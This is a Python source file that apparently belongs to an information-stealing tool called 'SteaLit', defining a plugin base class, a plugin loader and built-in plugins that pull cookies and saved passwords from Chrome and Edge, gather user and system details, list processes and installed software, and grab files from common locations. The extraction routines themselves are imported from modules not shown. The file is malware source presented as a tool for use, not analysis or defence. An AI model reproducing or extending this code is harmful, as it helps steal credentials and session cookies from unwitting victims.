"""
Plugin System for SteaLit
Allows easy addition of new data collection modules
"""

import os
import sys
import importlib
import inspect
from pathlib import Path
from typing import Dict, List, Any, Callable, Optional
from abc import ABC, abstractmethod

class SteaLitPlugin(ABC):
    """Base class for all SteaLit plugins"""
    
    @property
    @abstractmethod
    def name(self) -> str:
        """Plugin name"""
        pass
    
    @property
    @abstractmethod
    def description(self) -> str:
        """Plugin description"""
        pass
    
    @property
    @abstractmethod
    def version(self) -> str:
        """Plugin version"""
        pass
    
    @property
    def dependencies(self) -> List[str]:
        """List of required Python packages"""
        return []
    
    @property
    def enabled_by_default(self) -> bool:
        """Whether this plugin should be enabled by default"""
        return True
    
    @abstractmethod
    def collect_data(self, output_dir: Path) -> bool:
        """
        Main data collection method
        
        Args:
            output_dir: Directory where plugin should save its output
            
        Returns:
            True if successful, False otherwise
        """
        pass
    
    def check_dependencies(self) -> bool:
        """Check if all required dependencies are available"""
        for dep in self.dependencies:
            try:
                importlib.import_module(dep)
            except ImportError:
                return False
        return True
    
    def get_output_files(self, output_dir: Path) -> List[Path]:
        """
        Return list of files created by this plugin
        Override this method if your plugin creates files with predictable names
        """
        return list(output_dir.glob("*")) if output_dir.exists() else []


class PluginManager:
    """Manages loading and execution of plugins"""
    
    def __init__(self):
        self.plugins: Dict[str, SteaLitPlugin] = {}
        self.plugin_configs: Dict[str, Dict[str, Any]] = {}
        
    def register_plugin(self, plugin: SteaLitPlugin):
        """Register a plugin instance"""
        self.plugins[plugin.name] = plugin
        
    def load_plugins_from_directory(self, plugins_dir: Path):
        """Load plugins from a directory"""
        if not plugins_dir.exists():
            return
            
        # Add plugins directory to Python path
        if str(plugins_dir) not in sys.path:
            sys.path.insert(0, str(plugins_dir))
        
        # Find all Python files in plugins directory
        for py_file in plugins_dir.glob("*.py"):
            if py_file.name.startswith("_"):
                continue
                
            module_name = py_file.stem
            try:
                module = importlib.import_module(module_name)
                
                # Look for classes that inherit from SteaLitPlugin
                for name, obj in inspect.getmembers(module, inspect.isclass):
                    if (issubclass(obj, SteaLitPlugin) and 
                        obj is not SteaLitPlugin and
                        not inspect.isabstract(obj)):
                        
                        plugin_instance = obj()
                        self.register_plugin(plugin_instance)
                        print(f"[Plugin] Loaded: {plugin_instance.name} v{plugin_instance.version}")
                        
            except Exception as e:
                print(f"[Plugin] Failed to load {module_name}: {e}")
    
    def get_plugin(self, name: str) -> Optional[SteaLitPlugin]:
        """Get plugin by name"""
        return self.plugins.get(name)
    
    def list_plugins(self) -> List[str]:
        """List all registered plugin names"""
        return list(self.plugins.keys())
    
    def get_enabled_plugins(self, config: Dict[str, bool] = None) -> List[SteaLitPlugin]:
        """Get list of enabled plugins"""
        if config is None:
            config = {}
            
        enabled = []
        for name, plugin in self.plugins.items():
            # Check if explicitly enabled/disabled in config
            if name in config:
                if config[name]:
                    enabled.append(plugin)
            else:
                # Use plugin's default enabled state
                if plugin.enabled_by_default:
                    enabled.append(plugin)
                    
        return enabled
    
    def check_plugin_dependencies(self, plugin_name: str) -> bool:
        """Check if plugin dependencies are satisfied"""
        plugin = self.get_plugin(plugin_name)
        if not plugin:
            return False
        return plugin.check_dependencies()
    
    def execute_plugin(self, plugin_name: str, output_dir: Path) -> bool:
        """Execute a specific plugin"""
        plugin = self.get_plugin(plugin_name)
        if not plugin:
            print(f"[Plugin] Plugin '{plugin_name}' not found")
            return False
            
        if not plugin.check_dependencies():
            print(f"[Plugin] Plugin '{plugin_name}' dependencies not satisfied")
            return False
            
        try:
            plugin_output_dir = output_dir / plugin_name.lower().replace(" ", "_")
            plugin_output_dir.mkdir(parents=True, exist_ok=True)
            
            print(f"[Plugin] Executing: {plugin.name}")
            result = plugin.collect_data(plugin_output_dir)
            
            if result:
                print(f"[Plugin] {plugin.name} completed successfully")
            else:
                print(f"[Plugin] {plugin.name} failed")
                
            return result
            
        except Exception as e:
            print(f"[Plugin] Error executing {plugin.name}: {e}")
            return False


# Built-in plugins for existing modules
class CookiesPlugin(SteaLitPlugin):
    @property
    def name(self) -> str:
        return "Cookies Extractor"
    
    @property
    def description(self) -> str:
        return "Extracts browser cookies from Chrome and Edge"
    
    @property
    def version(self) -> str:
        return "1.0.0"
    
    @property
    def dependencies(self) -> List[str]:
        return ["win32crypt", "Crypto.Cipher"]
    
    def collect_data(self, output_dir: Path) -> bool:
        try:
            from .cookies_extractor import get_browser_cookies
            return get_browser_cookies(str(output_dir))
        except Exception as e:
            print(f"[Cookies Plugin] Error: {e}")
            return False


class PasswordsPlugin(SteaLitPlugin):
    @property
    def name(self) -> str:
        return "Passwords Extractor"
    
    @property
    def description(self) -> str:
        return "Extracts browser passwords from Chrome and Edge"
    
    @property
    def version(self) -> str:
        return "1.0.0"
    
    @property
    def dependencies(self) -> List[str]:
        return ["win32crypt", "Crypto.Cipher"]
    
    def collect_data(self, output_dir: Path) -> bool:
        try:
            from .passwords_extractor import get_browser_passwords
            return get_browser_passwords(str(output_dir))
        except Exception as e:
            print(f"[Passwords Plugin] Error: {e}")
            return False


class UserInfoPlugin(SteaLitPlugin):
    @property
    def name(self) -> str:
        return "User Information"
    
    @property
    def description(self) -> str:
        return "Collects system and user information"
    
    @property
    def version(self) -> str:
        return "1.0.0"
    
    def collect_data(self, output_dir: Path) -> bool:
        try:
            from .user_info_collector import collect_user_info
            return collect_user_info(str(output_dir / "UserInformation.txt"))
        except Exception as e:
            print(f"[UserInfo Plugin] Error: {e}")
            return False


class ProcessesPlugin(SteaLitPlugin):
    @property
    def name(self) -> str:
        return "Process List"
    
    @property
    def description(self) -> str:
        return "Collects running processes information"
    
    @property
    def version(self) -> str:
        return "1.0.0"
    
    def collect_data(self, output_dir: Path) -> bool:
        try:
            from .process_collector import collect_processes
            return collect_processes(str(output_dir / "ProcessList.txt"))
        except Exception as e:
            print(f"[Processes Plugin] Error: {e}")
            return False


class SoftwarePlugin(SteaLitPlugin):
    @property
    def name(self) -> str:
        return "Installed Software"
    
    @property
    def description(self) -> str:
        return "Collects installed software and browsers information"
    
    @property
    def version(self) -> str:
        return "1.0.0"
    
    def collect_data(self, output_dir: Path) -> bool:
        try:
            from .software_collector import collect_installed_software
            return collect_installed_software(str(output_dir))
        except Exception as e:
            print(f"[Software Plugin] Error: {e}")
            return False


class FileGrabberPlugin(SteaLitPlugin):
    @property
    def name(self) -> str:
        return "File Grabber"
    
    @property
    def description(self) -> str:
        return "Scans common locations for interesting files"
    
    @property
    def version(self) -> str:
        return "1.0.0"
    
    @property
    def dependencies(self) -> List[str]:
        return []  # Optional dependencies handled in the module
    
    @property
    def enabled_by_default(self) -> bool:
        return False  # Disabled by default due to potential size
    
    def collect_data(self, output_dir: Path) -> bool:
        try:
            from .file_grabber import grab_files_from_common_locations
            return grab_files_from_common_locations(str(output_dir))
        except Exception as e:
            print(f"[FileGrabber Plugin] Error: {e}")
            return False


def get_default_plugin_manager() -> PluginManager:
    """Get plugin manager with built-in plugins registered"""
    manager = PluginManager()
    
    # Register built-in plugins
    manager.register_plugin(CookiesPlugin())
    manager.register_plugin(PasswordsPlugin())
    manager.register_plugin(UserInfoPlugin())
    manager.register_plugin(ProcessesPlugin())
    manager.register_plugin(SoftwarePlugin())
    manager.register_plugin(FileGrabberPlugin())
    
    return manager
